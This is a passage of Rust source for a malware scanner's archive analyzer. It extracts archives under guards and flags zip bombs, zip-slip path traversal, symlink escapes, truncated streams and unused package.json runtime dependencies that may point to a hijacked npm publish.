//! Archive analyzer for various archive formats.

pub(crate) mod analyzers;
mod asar;
mod guards;
#[cfg(test)]
mod guards_test;
mod iso;
mod system_packages;
mod tar;
pub(crate) mod utils;
pub(crate) mod zip;

pub(crate) use guards::HostileArchiveReason;
pub(crate) use guards::MAX_ZIP_ENTRIES;

use crate::analyzers::{AnalysisInput, Analyzer, FileType, FileTypeExt};
use crate::capabilities::CapabilityMapper;
use crate::types::{
    AnalysisReport, ArchiveEntry, Criticality, Evidence, FileAnalysis, Finding, FindingCounts,
    FindingKind, ReportSummary, SampleExtractionConfig, StructuralFeature, TargetInfo,
};
use crate::yara_engine::YaraEngine;
use anyhow::{Context, Result};
use std::fs::File;
use std::fs::{self};
use std::path::Path;
use std::sync::Arc;

use crate::composite_rules::SectionMap;
use ::zip::ZipArchive;
use guards::{
    ExtractedMemberMetadata, ExtractionGuard, MAX_FILE_COUNT, MAX_FILE_SIZE, MAX_TOTAL_SIZE,
    sanitize_entry_path,
};
use utils::calculate_sha256;

/// Default maximum file size to keep in memory (100 MB)
pub(crate) const DEFAULT_MAX_MEMORY_FILE_SIZE: u64 = 100 * 1024 * 1024;
const MAX_ARCHIVE_PATH_TRAVERSAL_EVIDENCE: usize = 10;
/// Extraction notes attached as evidence to the incomplete-archive finding.
/// The rest still reach `metadata.errors`; this only bounds the rendered set.
const MAX_INCOMPLETE_ARCHIVE_EVIDENCE: usize = 5;
const MIN_PATH_CORPUS_ENTRY_COUNT: usize = 32;
const MIN_PATH_CORPUS_TRAVERSAL_ENTRIES: usize = 4;
const MIN_PATH_CORPUS_EDGE_CASE_ENTRIES: usize = 24;
const MAX_PATH_CORPUS_FILE_SIZE: u64 = 512;
const MAX_PATH_CORPUS_TOTAL_SIZE: u64 = 128 * 1024;

fn is_zip_container(file_type: FileType) -> bool {
    matches!(
        file_type,
        FileType::Zip
            | FileType::Jar
            | FileType::Whl
            | FileType::Crx
            | FileType::Xpi
            | FileType::ApkAndroid
            | FileType::Conda
            | FileType::Egg
            | FileType::Nupkg
            | FileType::Ipa
            | FileType::Vsix
    )
}

/// Count `package.json` runtime `dependencies` that no shipped module imports.
///
/// A phantom runtime dependency — declared but never `import`ed/`require`d
/// anywhere in the package's own code — is the fingerprint of an install-time
/// payload: a hijacked publisher appends a malicious package to `dependencies`
/// (its `postinstall` does the work) without touching the code that would
/// reference it. The June 2026 Mastra scope-takeover injected `easy-day-js`
/// exactly this way.
///
/// Returns `None` (no metric emitted) unless the archive holds a `package.json`
/// with runtime dependencies *and* at least one import was observed across its
/// members — without any imports we cannot distinguish "unused" from "we never
/// parsed the code", and a types-only / asset package would false-positive.
///
/// Matching is by package name: an import specifier counts as a use of dep `D`
/// when it equals `D` or begins with `D/` (a subpath import like
/// `dayjs/plugin/utc`). Only `dependencies` is considered — never
/// `devDependencies`/`peerDependencies`/`optionalDependencies`, which the
/// shipped runtime code is not expected to import.
fn compute_unused_runtime_deps(report: &AnalysisReport) -> Option<u64> {
    const DEP_PREFIX: &str = "dependencies.";

    // Declared runtime dependency names, read from the package.json member's
    // flattened kv (`dependencies.<name>` → version scalar). `<name>` may carry
    // a scope (`@scope/pkg`) or a dot (`lodash.merge`); the whole remainder is
    // the name.
    let declared: Vec<&str> = report
        .files
        .iter()
        .filter(|f| {
            Path::new(&f.path)
                .file_name()
                .and_then(|n| n.to_str())
                .is_some_and(|n| n.eq_ignore_ascii_case("package.json"))
        })
        .flat_map(|f| f.kv.keys())
        .filter_map(|k| k.strip_prefix(DEP_PREFIX))
        .collect();
    if declared.is_empty() {
        return None;
    }

    // Every module specifier imported by a *code* member. The manifest and
    // lockfiles are skipped: cleave surfaces a package.json's declared
    // dependencies as `imports` (so `type: import` matchers can target them),
    // and counting those here would make every dependency look "used" and mask
    // the very phantom we are hunting.
    let is_manifest_like = |path: &str| {
        Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .is_some_and(|n| {
                n.eq_ignore_ascii_case("package.json")
                    || n.eq_ignore_ascii_case("package-lock.json")
                    || n.eq_ignore_ascii_case("npm-shrinkwrap.json")
            })
    };
    let imported: Vec<&str> = report
        .files
        .iter()
        .filter(|f| !is_manifest_like(&f.path))
        .flat_map(|f| f.imports.iter())
        .map(|imp| imp.symbol.as_str())
        .collect();
    if imported.is_empty() {
        return None;
    }

    let used = |dep: &str| {
        imported
            .iter()
            .any(|spec| *spec == dep || spec.strip_prefix(dep).is_some_and(|r| r.starts_with('/')))
    };
    Some(declared.iter().filter(|dep| !used(dep)).count() as u64)
}

fn archive_finding(
    id: &str,
    desc: String,
    _source: &str,
    evidence: Vec<Evidence>,
    match_count: usize,
) -> Finding {
    let crit = if id == "anti-analysis/archive/excessive-size"
        || id == "anti-analysis/archive/long-entry-name"
    {
        Criticality::Notable
    } else {
        Criticality::Suspicious
    };

    Finding {
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: id.into(),
        desc: desc.into(),
        conf: 0.9,
        crit,
        mbc: None,
        attack: None,
        evidence,
        match_count,
        source_file: None,
    }
}

fn has_builtin_anti_analysis_finding(findings: &[Finding]) -> bool {
    findings.iter().any(|finding| {
        finding.id.starts_with("anti-analysis/archive/")
            || finding
                .id
                .starts_with("objectives/anti-analysis/pe-tampering/")
    })
}

/// Drain the guard's non-fatal extraction notes into the report, raising one
/// finding when any were recorded.
///
/// An archive we could only read part of is worth surfacing — truncating a
/// container is a cheap way past a scanner that bails on a bad member, which is
/// exactly the failure this recovery path exists for — but it is also the
/// everyday shape of an interrupted download. So it lands at `Notable`
/// ([`Criticality::score_weight`] 1, against 40 for suspicious): visible in the
/// trait list and the LLM render, without nudging a benign sample's verdict.
///
/// The `anti-analysis/malformed/` family is deliberate, matching the ELF and
/// Mach-O header-parse findings. `anti-analysis/archive/` would trip
/// [`has_builtin_anti_analysis_finding`]'s retroactive-suppression pass, which
/// exists for hostile-container findings, not for "the bytes ran out".
fn drain_extraction_notes(report: &mut AnalysisReport, guard: &ExtractionGuard) {
    let notes = guard.take_extraction_notes();
    if notes.is_empty() {
        return;
    }

    let evidence = notes
        .iter()
        .take(MAX_INCOMPLETE_ARCHIVE_EVIDENCE)
        .map(|note| Evidence {
            method: "archive_extraction".to_string(),
            source: "archive_analyzer".to_string(),
            value: note.clone(),
            location: None,
            ..Default::default()
        })
        .collect();

    report.findings.push(Finding {
        src: None,
        kind: FindingKind::Structural,
        trait_refs: vec![],
        id: "anti-analysis/malformed/archive-incomplete"
            .to_string()
            .into(),
        desc: format!(
            "Archive could only be read in part ({} extraction {})",
            notes.len(),
            if notes.len() == 1 {
                "problem"
            } else {
                "problems"
            }
        )
        .into(),
        conf: 1.0,
        crit: Criticality::Notable,
        mbc: None,
        attack: None,
        evidence,
        match_count: notes.len(),
        source_file: None,
    });

    report.metadata.errors.extend(notes);
}

fn push_archive_hostile_findings(
    report: &mut AnalysisReport,
    hostile_reasons: Vec<HostileArchiveReason>,
    archive_path: &Path,
    source: &str,
    suppress_path_traversal: bool,
) {
    let mut path_evidence = Vec::new();

    for reason in hostile_reasons {
        match reason {
            HostileArchiveReason::PathTraversal(path) => {
                if suppress_path_traversal {
                    continue;
                }

                path_evidence.push(Evidence {
                    method: "archive_extraction".to_string(),
                    source: source.to_string(),
                    value: format!("path:{}", path),
                    location: None,
                    ..Default::default()
                });
            }
            HostileArchiveReason::ZipBomb {
                compressed,
                uncompressed,
            } => {
                report.findings.push(archive_finding(
                    "anti-analysis/archive/zip-bomb",
                    "Archive has suspicious compression ratio (potential zip bomb)".to_string(),
                    source,
                    vec![Evidence {
                        method: "archive_extraction".to_string(),
                        source: source.to_string(),
                        value: format!(
                            "ratio:{}:1 ({}B -> {}B)",
                            uncompressed / compressed.max(1),
                            compressed,
                            uncompressed
                        ),
                        location: None,
                        ..Default::default()
                    }],
                    1,
                ));
            }
            HostileArchiveReason::ExcessiveFileCount(count) => {
                if is_expected_large_package_archive(archive_path) {
                    continue;
                }
                report.findings.push(archive_finding(
                    "anti-analysis/archive/excessive-files",
                    "Archive contains excessive number of files".to_string(),
                    source,
                    vec![Evidence {
                        method: "archive_extraction".to_string(),
                        source: source.to_string(),
                        value: format!("count:{} (LIMIT_DEBUG:{})", count, MAX_FILE_COUNT),
                        location: None,
                        ..Default::default()
                    }],
                    1,
                ));
            }
            HostileArchiveReason::ExcessiveTotalSize(size) => {
                report.findings.push(archive_finding(
                    "anti-analysis/archive/excessive-size",
                    "Archive expands to excessive total size".to_string(),
                    source,
                    vec![Evidence {
                        method: "archive_extraction".to_string(),
                        source: source.to_string(),
                        value: format!("size:{} bytes (limit:{})", size, MAX_TOTAL_SIZE),
                        location: None,
                        ..Default::default()
                    }],
                    1,
                ));
            }
            HostileArchiveReason::ExcessiveFileSize { file, size } => {
                report.findings.push(Finding {
                    src: None,
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "anti-analysis/archive/large-file".to_string().into(),
                    desc: "Archive contains excessively large file".to_string().into(),
                    conf: 0.9,
                    crit: Criticality::Notable,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "archive_extraction".to_string(),
                        source: source.to_string(),
                        value: format!("file:{} size:{} (limit:{})", file, size, MAX_FILE_SIZE),
                        location: None,
                        ..Default::default()
                    }],
                    match_count: 1,
                    source_file: None,
                });
            }
            HostileArchiveReason::ExcessiveEntryName { len, preview } => {
                let (id, desc) = if len > 1024 {
                    (
                        "anti-analysis/archive/hostile-entry-name",
                        format!("Archive entry has hostile-length name ({len} bytes)"),
                    )
                } else {
                    (
                        "anti-analysis/archive/long-entry-name",
                        format!("Archive entry has excessively long name ({len} bytes)"),
                    )
                };
                report.findings.push(archive_finding(
                    id,
                    desc,
                    source,
                    vec![Evidence {
                        method: "archive_extraction".to_string(),
                        source: source.to_string(),
                        value: format!("name_len:{len} preview:{preview}"),
                        location: None,
                        ..Default::default()
                    }],
                    1,
                ));
            }
            HostileArchiveReason::SymlinkEscape(path) => {
                if !is_benign_archive_symlink_escape(source, &path) {
                    report.findings.push(archive_finding(
                        "anti-analysis/archive/symlink-escape",
                        "Archive contains symlink that may escape extraction directory".to_string(),
                        source,
                        vec![Evidence {
                            method: "archive_extraction".to_string(),
                            source: source.to_string(),
                            value: format!("symlink:{}", path),
                            location: None,
                            ..Default::default()
                        }],
                        1,
                    ));
                }
            }
        }
    }

    if !path_evidence.is_empty() {
        let match_count = path_evidence.len();
        path_evidence.truncate(MAX_ARCHIVE_PATH_TRAVERSAL_EVIDENCE);
        report.findings.push(archive_finding(
            "anti-analysis/archive/path-traversal",
            "Archive contains path traversal entries (zip slip)".to_string(),
            source,
            path_evidence,
            match_count,
        ));
    }
}

fn is_expected_large_package_archive(path: &Path) -> bool {
    let path = path.to_string_lossy();
    path.contains("/pkg_freebsd/")
        && (path.contains("opensearch-dashboards-") || path.contains("flat-remix-icon-themes-"))
}

fn path_looks_synthetic_edge_case(name: &str) -> bool {
    if name.chars().any(|c| c.is_control() || !c.is_ascii()) {
        return true;
    }

    if name == "." || name == ".." || name == "/" || name == "../" {
        return true;
    }

    if name.starts_with(' ')
        || name.ends_with(' ')
        || name.contains('\t')
        || name.contains('\n')
        || name.contains('\r')
        || name.contains('\\')
        || name.contains("//")
        || name.contains("/./")
        || name.contains("/../")
        || name.starts_with("./")
        || name.starts_with("../")
        || name.starts_with('/')
    {
        return true;
    }

    if name.contains(':')
        || name.contains('*')
        || name.contains('?')
        || name.contains('<')
        || name.contains('>')
        || name.contains('|')
        || name.contains('"')
    {
        return true;
    }

    let basename = name.rsplit(['/', '\\']).next().unwrap_or(name);
    let trimmed = basename.trim().trim_end_matches('.');
    let device = trimmed
        .split('.')
        .next()
        .unwrap_or(trimmed)
        .trim_end_matches(' ')
        .to_ascii_uppercase();

    matches!(
        device.as_str(),
        "NUL"
            | "CON"
            | "PRN"
            | "AUX"
            | "CLOCK$"
            | "COM1"
            | "COM2"
            | "COM3"
            | "COM4"
            | "COM5"
            | "COM6"
            | "COM7"
            | "COM8"
            | "COM9"
            | "LPT1"
            | "LPT2"
            | "LPT3"
            | "LPT4"
            | "LPT5"
            | "LPT6"
            | "LPT7"
            | "LPT8"
            | "LPT9"
    )
}

fn is_benign_archive_symlink_escape(source: &str, path: &str) -> bool {
    let source = source.trim();
    let path = path.trim();

    if (path.contains("/node_gyp_bins/python3") || path.contains("/node_gyp_bins/python"))
        && (path.ends_with("-> /usr/bin/python3") || path.ends_with("-> /usr/bin/python"))
    {
        return true;
    }

    if let Some((link_name, target)) = path.split_once("->") {
        let link_name = link_name.trim();
        let target = target.trim();
        let system_link = link_name.starts_with("etc/")
            || link_name.starts_with("lib")
            || link_name.starts_with("bin/")
            || link_name.starts_with("sbin")
            || link_name.starts_with("usr/")
            || link_name == "var/lock"
            || link_name.starts_with("var/run");
        let system_target = target.starts_with("/usr/share/")
            || target.starts_with("/usr/bin/")
            || target.starts_with("/usr/sbin/")
            || target.starts_with("/bin/")
            || target.starts_with("/lib/systemd/")
            || target.starts_with("/etc/alternatives/")
            || target.starts_with("/etc/ssl/")
            || target.starts_with("/etc/dpkg/")
            || target == "/etc/localtime"
            || target == "/run"
            || target == "/run/lock";
        if system_link && system_target {
            return true;
        }
    }

    let source_lc = source.to_ascii_lowercase();
    let system_package_or_container = source_lc.ends_with(".pkg.tar.zst")
        || source_lc.ends_with(".pkg.tar.xz")
        || source_lc.ends_with(".pkg.tar.gz")
        || source_lc.contains("docker.io_")
        || source_lc.contains("ghcr.io_")
        || source_lc.contains("quay.io_")
        || source_lc.contains("registry.k8s.io_");
    if system_package_or_container && path.contains(" -> ") {
        return true;
    }

    source
        .split(['/', '\\', '!'])
        .chain(path.split("->").next().unwrap_or("").split(['/', '\\']))
        .any(|component| matches!(component, "testdata" | "fixture" | "fixtures"))
}

fn path_is_fixture_context(path: &str) -> bool {
    path.split(['/', '\\', '!'])
        .any(|component| matches!(component, "testdata" | "fixture" | "fixtures"))
}

fn is_zip_path_edge_case_corpus(file_path: &Path) -> bool {
    let Ok(file) = File::open(file_path) else {
        return false;
    };
    let Ok(mut archive) = ZipArchive::new(file) else {
        return false;
    };
    if archive.len() > guards::MAX_ZIP_ENTRIES {
        return false;
    }

    let mut total_entries = 0usize;
    let mut traversal_entries = 0usize;
    let mut edge_case_entries = 0usize;
    let mut total_size = 0u64;
    let mut max_size = 0u64;

    for i in 0..archive.len() {
        let Ok(entry) = archive.by_index(i) else {
            return false;
        };

        total_entries += 1;
        let name = entry.name();
        let size = entry.size();
        total_size += size;
        max_size = max_size.max(size);

        if sanitize_entry_path(name, Path::new("/tmp/cleave-archive-inspect")).is_none() {
            traversal_entries += 1;
        }
        if path_looks_synthetic_edge_case(name) {
            edge_case_entries += 1;
        }
    }

    total_entries >= MIN_PATH_CORPUS_ENTRY_COUNT
        && traversal_entries >= MIN_PATH_CORPUS_TRAVERSAL_ENTRIES
        && edge_case_entries >= MIN_PATH_CORPUS_EDGE_CASE_ENTRIES
        && max_size <= MAX_PATH_CORPUS_FILE_SIZE
        && total_size <= MAX_PATH_CORPUS_TOTAL_SIZE
}

fn should_suppress_path_traversal_findings(
    file_path: &Path,
    hostile_reasons: &[HostileArchiveReason],
) -> bool {
    if !hostile_reasons
        .iter()
        .any(|reason| matches!(reason, HostileArchiveReason::PathTraversal(_)))
    {
        return false;
    }

    let file_type = crate::analyzers::detect_file_type(file_path).unwrap_or(FileType::Unknown);
    let filename = file_path
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let is_system_package = matches!(file_type, FileType::PkgArch | FileType::PkgFreebsd)
        || filename.ends_with(".pkg")
        || filename.ends_with(".pkg.tar.zst")
        || filename.ends_with(".pkg.tar.xz")
        || filename.ends_with(".pkg.tar.gz");

    if is_system_package {
        return true;
    }

    matches!(file_type, FileType::Zip | FileType::Jar) && is_zip_path_edge_case_corpus(file_path)
}

/// Analyzes archive files (zip, tar, 7z, etc.) by extracting and analyzing each member
#[derive(Debug)]
pub(crate) struct ArchiveAnalyzer {
    max_depth: usize,
    current_depth: usize,
    /// Path prefix for nested archives (e.g., "inner.tar.gz" becomes "outer.zip!inner.tar.gz")
    archive_path_prefix: Option<String>,
    capability_mapper: Option<Arc<CapabilityMapper>>,
    yara_engine: Option<Arc<YaraEngine>>,
    /// Passwords to try for encrypted zip files
    zip_passwords: Arc<[String]>,
    /// Optional sample extraction configuration
    sample_extraction: Option<SampleExtractionConfig>,
    /// Maximum file size to keep in memory during extraction.
    /// Files larger than this are written to temp files.
    max_memory_file_size: u64,
    /// Per-request cancellation flag — checked in streaming loops.
    cancelled: Option<Arc<std::sync::atomic::AtomicBool>>,
    /// Analysis options for member-level cache lookups.
    analysis_options: Option<Arc<crate::AnalysisOptions>>,
}

#[derive(Clone, Debug, Default)]
pub(crate) struct ArchiveAnalyzerConfig {
    sample_extraction: Option<SampleExtractionConfig>,
    max_memory_file_size: Option<u64>,
    analysis_options: Option<Arc<crate::AnalysisOptions>>,
    cancellation: Option<Arc<std::sync::atomic::AtomicBool>>,
}

impl ArchiveAnalyzerConfig {
    #[must_use]
    pub(crate) fn from_analysis_options(options: &crate::AnalysisOptions) -> Self {
        Self {
            sample_extraction: options.sample_extraction.clone(),
            max_memory_file_size: Some(options.max_memory_file_size),
            analysis_options: Some(Arc::new(options.clone())),
            cancellation: options.cancellation.clone(),
        }
    }

    #[must_use]
    pub(crate) fn with_cancellation(
        mut self,
        flag: Option<Arc<std::sync::atomic::AtomicBool>>,
    ) -> Self {
        self.cancellation = flag;
        self
    }

    #[must_use]
    pub(crate) fn apply(&self, mut analyzer: ArchiveAnalyzer) -> ArchiveAnalyzer {
        if let Some(config) = &self.sample_extraction {
            analyzer = analyzer.with_sample_extraction(config.clone());
        }
        if let Some(size) = self.max_memory_file_size {
            analyzer = analyzer.with_max_memory_file_size(size);
        }
        if let Some(options) = &self.analysis_options {
            analyzer = analyzer.with_analysis_options(options.clone());
        }
        if let Some(flag) = &self.cancellation {
            analyzer = analyzer.with_cancellation(flag.clone());
        }
        analyzer
    }
}

/// Decompress a single-file stream into `dest_dir`, applying size and ratio guards.
///
/// The output filename is derived from `archive_path`'s stem (e.g. `foo.gz` → `foo`).
const MAX_RECURSIVE_DECOMPRESSION_LAYERS: usize = 16;

fn decompress_to_file<R: std::io::Read>(
    mut decoder: R,
    archive_path: &Path,
    dest_dir: &Path,
    compressed_size: u64,
    guard: &guards::ExtractionGuard,
) -> Result<()> {
    decompress_to_file_at_depth(
        &mut decoder,
        archive_path,
        dest_dir,
        compressed_size,
        guard,
        0,
    )
}

/// Decode `reader` to exhaustion, keeping whatever came out before a truncated
/// or corrupt stream cut it short.
///
/// A single-file compressed stream is decoded entirely in memory before any of
/// it reaches `dest_dir`, so propagating the read error would throw away every
/// byte recovered so far and leave the extraction directory empty — which
/// `analyze_archive_with_data` can only report as a total analysis failure. A
/// truncated `.gz` therefore used to yield no verdict at all, even when the
/// decoded prefix was a complete tar minus its last member. That is both a
/// routine collection artifact and a cheap way to make a scanner give up, so
/// the prefix is what we analyze: those bytes decoded successfully and are as
/// genuine as any others. Only a stream that yields nothing is a hard error —
/// there is nothing to fall back to, and the caller should hear why.
fn decode_stream_tolerant<R: std::io::Read>(
    reader: &mut R,
    stem: &str,
    guard: &guards::ExtractionGuard,
) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    // Matches the tar extractor's chunk: small enough to check cancellation
    // promptly on a stream that decodes for minutes.
    let mut buf = [0u8; 65536];
    loop {
        if guard.is_cancelled() {
            anyhow::bail!("cancelled");
        }
        match std::io::Read::read(reader, &mut buf) {
            Ok(0) => return Ok(out),
            Ok(n) => out.extend_from_slice(&buf[..n]),
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => {}
            Err(e) if out.is_empty() => {
                return Err(anyhow::Error::new(e).context(format!("Failed to decompress: {stem}")));
            }
            Err(e) => {
                tracing::debug!(
                    stem,
                    decoded_bytes = out.len(),
                    error = %e,
                    "compressed stream ended early; analyzing the decoded prefix",
                );
                guard.add_extraction_note(format!(
                    "{stem}: compressed stream ended early after {} bytes ({e}); analyzed the decoded prefix",
                    out.len()
                ));
                return Ok(out);
            }
        }
    }
}

fn decompress_to_file_at_depth<R: std::io::Read>(
    mut decoder: R,
    archive_path: &Path,
    dest_dir: &Path,
    compressed_size: u64,
    guard: &guards::ExtractionGuard,
    decompression_depth: usize,
) -> Result<()> {
    let stem = archive_path
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("extracted");
    let mut limited = guards::LimitedReader::new(&mut decoder, guards::MAX_FILE_SIZE);
    let decompressed = decode_stream_tolerant(&mut limited, stem, guard)?;
    let written = decompressed.len() as u64;
    guard.check_compression_ratio(compressed_size, written);
    guard.check_bytes(written, stem);

    extract_decompressed_data_or_write_file(
        decompressed,
        stem,
        dest_dir,
        guard,
        decompression_depth,
    )
}

fn extract_decompressed_data_or_write_file(
    data: Vec<u8>,
    stem: &str,
    dest_dir: &Path,
    guard: &guards::ExtractionGuard,
    decompression_depth: usize,
) -> Result<()> {
    use std::io::Cursor;

    if looks_like_tar_archive(&data) {
        return tar::extract_tar_entries_safe(Cursor::new(data), dest_dir, guard);
    }

    let logical_path = Path::new(stem);
    match crate::analyzers::detect_file_type_from_data(logical_path, &data) {
        FileType::Tar | FileType::Gem | FileType::OciImage | FileType::GentooBinpkg => {
            tar::extract_tar_entries_safe(Cursor::new(data), dest_dir, guard)
        }
        FileType::TarGz | FileType::Npm | FileType::Crate | FileType::PythonSdist => {
            tar::extract_tar_entries_safe(
                flate2::read::GzDecoder::new(Cursor::new(data)),
                dest_dir,
                guard,
            )
        }
        FileType::TarBz2 => tar::extract_tar_entries_safe(
            bzip2::read::BzDecoder::new(Cursor::new(data)),
            dest_dir,
            guard,
        ),
        FileType::TarXz => tar::extract_tar_entries_safe(
            xz2::read::XzDecoder::new(Cursor::new(data)),
            dest_dir,
            guard,
        ),
        FileType::TarZst | FileType::PkgArch | FileType::PkgFreebsd | FileType::Xbps => {
            tar::extract_tar_entries_safe(
                zstd::stream::read::Decoder::new(Cursor::new(data))
                    .context("Failed to create zstd decoder")?,
                dest_dir,
                guard,
            )
        }
        FileType::Gz | FileType::Bz2 | FileType::Xz | FileType::Zst
            if decompression_depth >= MAX_RECURSIVE_DECOMPRESSION_LAYERS =>
        {
            let mut out = File::create(dest_dir.join(stem))?;
            std::io::Write::write_all(&mut out, &data)?;
            Ok(())
        }
        FileType::Gz => decompress_to_file_at_depth(
            flate2::read::GzDecoder::new(Cursor::new(&data)),
            logical_path,
            dest_dir,
            data.len() as u64,
            guard,
            decompression_depth + 1,
        ),
        FileType::Bz2 => decompress_to_file_at_depth(
            bzip2::read::BzDecoder::new(Cursor::new(&data)),
            logical_path,
            dest_dir,
            data.len() as u64,
            guard,
            decompression_depth + 1,
        ),
        FileType::Xz => decompress_to_file_at_depth(
            xz2::read::XzDecoder::new(Cursor::new(&data)),
            logical_path,
            dest_dir,
            data.len() as u64,
            guard,
            decompression_depth + 1,
        ),
        FileType::Zst => decompress_to_file_at_depth(
            zstd::stream::read::Decoder::new(Cursor::new(&data))
                .context("Failed to create zstd decoder")?,
            logical_path,
            dest_dir,
            data.len() as u64,
            guard,
            decompression_depth + 1,
        ),
        _ => {
            let mut out = File::create(dest_dir.join(stem))?;
            std::io::Write::write_all(&mut out, &data)?;
            Ok(())
        }
    }
}

fn looks_like_tar_archive(data: &[u8]) -> bool {
    if data.get(257..262) == Some(b"ustar") {
        return true;
    }
    if data.len() < 512 {
        return false;
    }

    let checksum_field = &data[148..156];
    let checksum_text = checksum_field
        .iter()
        .copied()
        .take_while(|b| *b != 0 && *b != b' ')
        .collect::<Vec<_>>();
    if checksum_text.is_empty() || !checksum_text.iter().all(u8::is_ascii_digit) {
        return false;
    }
    let Ok(expected) =
        u32::from_str_radix(std::str::from_utf8(&checksum_text).unwrap_or_default(), 8)
    else {
        return false;
    };

    let actual = data[..512]
        .iter()
        .enumerate()
        .map(|(i, b)| {
            if (148..156).contains(&i) {
                b' ' as u32
            } else {
                *b as u32
            }
        })
        .sum::<u32>();
    actual == expected
}

impl ArchiveAnalyzer {
    /// Create a new archive analyzer with default settings
    #[must_use]
    pub(crate) fn new() -> Self {
        Self {
            max_depth: 3,
            current_depth: 0,
            archive_path_prefix: None,
            capability_mapper: None,
            yara_engine: None,
            zip_passwords: Arc::from([]),
            sample_extraction: None,
            max_memory_file_size: DEFAULT_MAX_MEMORY_FILE_SIZE,
            cancelled: None,
            analysis_options: None,
        }
    }

    /// Returns true if the server has signalled cancellation for this request.
    pub(crate) fn is_cancelled(&self) -> bool {
        self.cancelled
            .as_ref()
            .is_some_and(|f| f.load(std::sync::atomic::Ordering::Acquire))
    }

    /// Set the maximum file size to keep in memory during extraction.
    /// Files larger than this are written to temp files.
    #[allow(dead_code)] // Used by binary target
    #[must_use]
    pub(crate) fn with_max_memory_file_size(mut self, size_bytes: u64) -> Self {
        self.max_memory_file_size = size_bytes;
        self
    }

    /// Get the maximum memory file size setting.
    #[allow(dead_code)] // Used by binary target
    #[must_use]
    pub(crate) fn max_memory_file_size(&self) -> u64 {
        self.max_memory_file_size
    }

    /// Set the current nesting depth (used for recursive archive extraction)
    #[must_use]
    pub(crate) fn with_depth(mut self, depth: usize) -> Self {
        self.current_depth = depth;
        self
    }

    /// Set the path prefix for nested archive paths (used for recursion)
    #[must_use]
    pub(crate) fn with_archive_prefix(mut self, prefix: String) -> Self {
        self.archive_path_prefix = Some(prefix);
        self
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    #[allow(dead_code)] // Used by the library target; the binary recompiles modules separately
    #[must_use]
    pub(crate) fn with_capability_mapper(mut self, mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Some(Arc::new(mapper));
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    #[must_use]
    pub(crate) fn with_capability_mapper_arc(mut self, mapper: Arc<CapabilityMapper>) -> Self {
        self.capability_mapper = Some(mapper);
        self
    }

    /// Set a YARA engine for scanning extracted files
    #[allow(dead_code)] // Used by library target (lib.rs), not binary
    #[must_use]
    pub(crate) fn with_yara(mut self, engine: YaraEngine) -> Self {
        self.yara_engine = Some(Arc::new(engine));
        self
    }

    /// Set YARA engine from an existing Arc (for nested analyzers)
    #[must_use]
    pub(crate) fn with_yara_arc(mut self, engine: Arc<YaraEngine>) -> Self {
        self.yara_engine = Some(engine);
        self
    }

    /// Set passwords to try for encrypted zip files
    #[must_use]
    #[allow(dead_code)]
    pub(crate) fn with_zip_passwords(mut self, passwords: Vec<String>) -> Self {
        self.zip_passwords = Arc::from(passwords);
        self
    }

    /// Set passwords from an existing Arc (for nested analyzers)
    #[must_use]
    pub(crate) fn with_zip_passwords_arc(mut self, passwords: Arc<[String]>) -> Self {
        self.zip_passwords = passwords;
        self
    }

    /// Set sample extraction configuration for extracting analyzed files to disk
    #[allow(dead_code)] // Used by binary target
    #[must_use]
    pub(crate) fn with_sample_extraction(mut self, config: SampleExtractionConfig) -> Self {
        self.sample_extraction = Some(config);
        self
    }

    /// Set a per-request cancellation flag. When set to true, streaming loops will stop early.
    #[must_use]
    pub(crate) fn with_cancellation(mut self, flag: Arc<std::sync::atomic::AtomicBool>) -> Self {
        self.cancelled = Some(flag);
        self
    }

    /// Set analysis options for member-level file cache lookups.
    #[must_use]
    pub(crate) fn with_analysis_options(mut self, options: Arc<crate::AnalysisOptions>) -> Self {
        self.analysis_options = Some(options);
        self
    }

    /// Promote every recovered member to a separate analysis record.
    ///
    /// Installer payloads use this because their data/config/resource members
    /// are part of the delivered artifact and must remain individually visible,
    /// even when the outer CLI scan did not request `--all-files` globally.
    #[must_use]
    pub(crate) fn with_all_files_members(mut self) -> Self {
        let mut options = self
            .analysis_options
            .as_deref()
            .cloned()
            .unwrap_or_default();
        options.all_files = true;
        self.analysis_options = Some(Arc::new(options));
        self
    }

    /// Capture the settings a member analyzer must pass to an archive nested
    /// inside that member (for example an Inno installer inside a ZIP).
    pub(crate) fn child_archive_config(&self) -> ArchiveAnalyzerConfig {
        ArchiveAnalyzerConfig {
            sample_extraction: self.sample_extraction.clone(),
            max_memory_file_size: Some(self.max_memory_file_size),
            analysis_options: self.analysis_options.clone(),
            cancellation: self.cancelled.clone(),
        }
    }

    /// Create a copy of this analyzer with the sample_extraction config updated
    /// to use the given archive SHA256 for extraction directory grouping.
    #[allow(dead_code)] // Used by binary target
    #[must_use]
    pub(crate) fn with_extraction_archive_sha256(&self, archive_sha256: &str) -> Self {
        Self {
            max_depth: self.max_depth,
            current_depth: self.current_depth,
            archive_path_prefix: self.archive_path_prefix.clone(),
            capability_mapper: self.capability_mapper.clone(),
            yara_engine: self.yara_engine.clone(),
            zip_passwords: self.zip_passwords.clone(),
            sample_extraction: self
                .sample_extraction
                .as_ref()
                .map(|c| c.with_archive_sha256(archive_sha256.to_owned())),
            max_memory_file_size: self.max_memory_file_size,
            cancelled: self.cancelled.clone(),
            analysis_options: self.analysis_options.clone(),
        }
    }

    /// Format a relative path with nesting prefix (for ArchiveEntry.path)
    /// - Single level: "lib/foo.so"
    /// - Nested: "inner.tar.gz!lib/foo.so"
    fn format_entry_path(&self, relative_path: &str) -> String {
        match &self.archive_path_prefix {
            Some(prefix) => format!("{}!{}", prefix, relative_path),
            None => relative_path.to_string(),
        }
    }

    /// Format a location for Evidence.location (includes archive: prefix)
    /// - Single level: "archive:lib/foo.so"
    /// - Nested: "archive:inner.tar.gz!lib/foo.so"
    fn format_evidence_location(&self, relative_path: &str) -> String {
        match &self.archive_path_prefix {
            Some(prefix) => format!("archive:{}!{}", prefix, relative_path),
            None => format!("archive:{}", relative_path),
        }
    }

    /// Analyze an archive with streaming output.
